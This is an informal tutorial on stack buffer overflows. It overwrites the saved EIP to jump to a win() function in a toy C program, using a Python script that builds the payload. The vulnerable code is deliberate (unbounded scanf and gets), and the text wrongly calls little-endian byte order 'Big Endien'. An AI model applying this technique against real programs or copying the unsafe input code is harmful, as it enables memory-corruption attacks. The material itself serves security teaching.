# EXPLOIT
	## STACK BUFFER OVERFLOW
		(Overwrite register (EIP)) :
			The EIP register backup (which is the one that points to the next address) is stored in the stack

			You can overwrite it from a buffer overflow simply by finding when does a crash or a segmentation fault occurs in a 		stack buffer overflow 
			
			---------------------------------------
			Example :
				C code
				---------------------------------------
				void win()
				{
					printf("Good job");
				}
				int main()
				{
					char buffer[64];
					scanf("%s", buffer);
				}
				---------------------------------------
				//As a basic buffer overflow, we're going to overflow `buffer` and then in addition, we have to add some more characters, and if the program has a segmentaion fault (crashes), it means that we overwrote the EIP register
				Execution :
				---------------------------------------
				(input)> (A)*64+(B)*?+(<EIP>)
			---------------------------------------
			
			(Now if we check in gdb, we can see that it's trying to jump to the hex ascii value of <EIP> or it has jumped to it if it's correct)
			
			---------------------------------------
			Example :
				So now, how to jump to win ? Well we have to find the win() function address, once it's done, all we have to do, is to set <EIP> to the win address in Big Endien, it means that it's reversed (the 0x doesn't matter):
					Example :
						55 fc ae
						Will be :
						ae fc 55
						
				But how to specify an hexadecimal value for the address ? Well we will have to use a programming language like python and then write the value to a file that we're going to use as input for our program :
					---------------------------------------------------
					Python exploit :
						#<exploit_filename>.py
						payload = 'A'*64 # 64 = max size of the buffer
						payload += 'B'*? 
						"""
						? : Path to eip that we know when we have a crash or segmentation fault
						"""
						payload += "\xae\xdc\x55" # : Assuming that the address of target function is "\xae\xdc\x55"
					
						file = open("<payload path+filename>", "w")
						file.write(payload)
						file.close()
					---------------------------------------------------
					Exploit :
						python <exploit_filename>.py
						<execute the program> < <payload path+filename>
						# It should jump to win() function
					---------------------------------------------------
			---------------------------------------
		(Overwrite register (EIP) (64 bits)) :
			If the program is compiled in 64 bits, then we have to add a certain number of '\x00' (null bytes) to EIP (at the end, don't reverse them)
EDIT :
For all those who can't get this working and don't get "0xXXXXXXXX in ??"
the solution is pretty simple, the vulnerable function where you will do the buffer overflow mustn't be in main() 
So this will work :
```c
#include <stdio.h>

void vuln()
{
	char buffer[20];
	gets(buffer);
}
int main()
{

	vuln();
}
```
